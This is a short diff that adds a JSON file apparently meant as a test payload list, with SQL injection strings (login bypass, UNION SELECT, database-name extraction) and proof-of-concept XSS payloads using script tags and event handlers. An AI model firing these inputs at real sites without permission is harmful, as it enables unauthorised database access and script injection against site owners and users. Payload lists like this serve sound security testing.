@@ -1,0 +1,15 @@
+{
+  "SQLI": [
+    "' OR 1=1 --",
+    "' UNION SELECT null,null,null --",
+    "admin'--",
+    "1 AND 1=0 UNION ALL SELECT 1,2,database() --"
+  ],
+  "XSS": [
+    "<script>alert(1)</script>",
+    "\"-alert(1)-",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "';alert(String.fromCharCode(88,83,83))//;"
+  ]
+}
